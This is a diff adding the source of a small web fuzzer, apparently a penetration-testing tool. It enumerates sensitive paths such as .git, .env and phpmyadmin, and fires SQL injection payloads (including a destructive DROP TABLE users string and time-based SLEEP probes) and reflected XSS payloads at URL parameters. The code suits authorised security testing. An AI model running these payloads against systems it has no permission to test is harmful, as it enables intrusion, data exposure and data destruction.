@@ -1,0 +1,107 @@
+# koppa-webfuzz — HTTP directory and parameter fuzzer
+import log, http, fuzz, encode
+
+const DEFAULT_DIRS = [
+    "admin", "login", "dashboard", "api", "config", "backup",
+    "uploads", "files", "images", "js", "css", "static",
+    "wp-admin", "wp-content", "phpmyadmin", "phpinfo.php",
+    ".git", ".env", ".htaccess", "robots.txt", "sitemap.xml",
+    "swagger", "api-docs", "v1", "v2", "graphql",
+    "console", "actuator", "health", "metrics", "debug",
+    "test", "dev", "staging", "old", "bak", "backup.zip"
+]
+
+fn dir_fuzz(base_url, wordlist) {
+    let words = wordlist
+    log.info("Fuzzing directories: {base_url} ({words.len} paths)")
+    var found = []
+    for path in words {
+        let url = "{base_url}/{path}"
+        let resp = http.get(url)
+        let status = resp["status"]
+        if status != 404 && status != 0 {
+            let color = status == 200 ? "success" : "warn"
+            log.info("  [{status}] {url}")
+            found.push({url: url, status: status, path: path})
+        }
+    }
+    log.info("Found {found.len} paths")
+    return found
+}
+
+fn dir_fuzz_default(base_url) {
+    return dir_fuzz(base_url, DEFAULT_DIRS)
+}
+
+fn param_fuzz(url, param, wordlist) {
+    log.info("Fuzzing parameter [{param}] on {url}")
+    var results = []
+    for word in wordlist {
+        let test_url = "{url}?{param}={word}"
+        let resp = http.get(test_url)
+        let status = resp["status"]
+        let body = resp["body"]
+        if body {
+            let body_len = body.len
+            results.push({word: word, status: status, length: body_len})
+        }
+    }
+    return results
+}
+
+fn sqli_fuzz(url, param) {
+    let payloads = [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "'; DROP TABLE users--",
+        "1 UNION SELECT null,null--",
+        "' AND SLEEP(3)--",
+        "1; WAITFOR DELAY '0:0:3'--",
+        "' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
+    ]
+    log.warn("SQLi fuzzing {url} param={param}")
+    var vulns = []
+    for payload in payloads {
+        let test_url = "{url}?{param}={encode.url_encode(payload)}"
+        let resp = http.get(test_url)
+        let body = resp["body"]
+        if body {
+            if body.contains("error") || body.contains("syntax") || body.contains("mysql") {
+                log.error("Potential SQLi: {payload}")
+                vulns.push({payload: payload, url: test_url})
+            }
+        }
+    }
+    return vulns
+}
+
+fn xss_fuzz(url, param) {
+    let payloads = [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "javascript:alert(1)",
+        "'><script>alert(document.domain)</script>",
+        "<svg onload=alert(1)>"
+    ]
+    log.warn("XSS fuzzing {url} param={param}")
+    var vulns = []
+    for payload in payloads {
+        let test_url = "{url}?{param}={encode.url_encode(payload)}"
+        let resp = http.get(test_url)
+        let body = resp["body"]
+        if body {
+            if body.contains(payload) || body.contains("<script>alert") {
+                log.error("Reflected XSS: {payload}")
+                vulns.push({payload: payload, url: test_url, type: "reflected"})
+            }
+        }
+    }
+    return vulns
+}
+
+fn main() {
+    let target = "http://example.com"
+    log.info("koppa-webfuzz demo")
+    let dirs = dir_fuzz_default(target)
+    log.info("Found {dirs.len} paths on {target}")
+}
